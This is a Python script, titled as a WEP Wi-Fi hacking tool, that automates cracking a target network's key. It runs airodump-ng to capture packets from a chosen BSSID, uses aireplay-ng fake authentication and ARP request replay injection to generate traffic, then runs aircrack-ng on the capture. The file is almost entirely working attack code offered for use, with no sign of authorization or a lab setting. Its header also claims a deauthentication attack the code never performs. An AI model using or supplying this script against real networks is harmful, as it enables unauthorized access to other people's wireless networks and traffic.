# Write a Python script to Hack a WEP Wi-Fi Network
# This script captures packets from a WEP-encrypted Wi-Fi network and performs a deauthentication attack to force clients to reconnect, allowing the capture of the necessary packets for cracking WEP encryption.

import os
import subprocess
import re
import threading
from datetime import datetime
import time

def get_interface_mac(interface):
    ifconfig_output = subprocess.check_output(["ifconfig", interface]).decode()
    match = re.search(r'unspec\s+([A-Fa-f0-9\-]+)', ifconfig_output)
    if match:
        mac = match.group(1).replace('-', ':')
        # Only take the first 17 characters (standard MAC format)
        return mac[:17]
    else:
        return None

def run_airodump(interface, target_mac, output_file, channel, stop_event):
    """
    Runs airodump-ng and monitors the #Data field.
    Stops when #Data >= 100000 or stop_event is set.
    """
    print(f"[+] Starting airodump-ng on {interface}, targeting {target_mac}, channel {channel}, saving to {output_file}")
    # Start airodump-ng as a subprocess
    proc = subprocess.Popen([
        "airodump-ng",
        "--bssid", target_mac,
        "-c", channel,
        "-w", output_file,
        interface
    ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)

    data_count = 0
    cap_file = output_file + ".cap"
    try:
        while True:
            # Check if .csv file exists and parse #Data from it
            csv_file = output_file + ".csv"
            if os.path.exists(csv_file):
                with open(csv_file, "r") as f:
                    for line in f:
                        # Look for the line with the BSSID and #Data
                        if target_mac.lower() in line.lower():
                            fields = line.split(',')
                            if len(fields) > 10:
                                try:
                                    data_count = int(fields[10].strip())
                                    print(f"[i] #Data captured: {data_count}", end='\r')
                                    if data_count >= 100000:
                                        print(f"\n[+] #Data reached {data_count}, stopping airodump-ng.")
                                        stop_event.set()
                                        proc.terminate()
                                        return cap_file
                                except ValueError:
                                    pass
            if stop_event.is_set():
                proc.terminate()
                return cap_file
            time.sleep(2)
    finally:
        proc.terminate()

def wep_wifi_hacking(interface, target_mac, gateway_mac):
    print(f"[+] Starting WEP Wi-Fi hacking on {target_mac} via {gateway_mac} using {interface}")
    mac = get_interface_mac(interface)
    if mac:
        print(f"[+] MAC address of {interface}: {mac}")
    else:
        print(f"[-] Could not find MAC address for {interface}")
        return

    channel = input("Enter the Wi-Fi channel to monitor (e.g., 1, 6, 11): ").strip()
    # Generate output file name with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = f"wep_capture_{timestamp}"

    # Ask user for ARP Request Replay Attack
    arp_replay = input("[?] Do you want to perform ARP Request Replay Attack? (y/n): ").strip().lower()
    stop_event = threading.Event()

    # Start airodump-ng in a separate thread
    airodump_result = [None]
    def airodump_thread_func():
        airodump_result[0] = run_airodump(interface, target_mac, output_file, channel, stop_event)
    airodump_thread = threading.Thread(target=airodump_thread_func)
    airodump_thread.start()

    if arp_replay == 'y':
        # Associate with the target network
        print(f"[+] Associating with {target_mac}...")
        subprocess.call(["aireplay-ng", "--fakeauth", "0", "-a", target_mac, "-h", mac, interface])
        print("[+] Performing ARP Request Replay Attack...")
        # Start the ARP replay attack
        subprocess.call(["aireplay-ng", "--arpreplay", "-b", target_mac, "-h", mac, interface])

    # Wait for airodump-ng to finish (when #Data >= 100000)
    airodump_thread.join()

    cap_file = airodump_result[0]
    if cap_file and os.path.exists(cap_file):
        print(f"[+] Captured enough data. Cracking WEP key using aircrack-ng on {cap_file} ...")
        subprocess.call(["aircrack-ng", cap_file])
    else:
        print("[-] Capture file not found or insufficient data.")

if __name__ == "__main__":
    interface = input("Enter the wireless interface name (e.g., wlan0): ").strip()
    target_mac = input("Enter the target Wi-Fi MAC address: ").strip()
    gateway_mac = input("Enter the gateway MAC address (leave blank if not known): ").strip() or None

    wep_wifi_hacking(interface, target_mac, gateway_mac)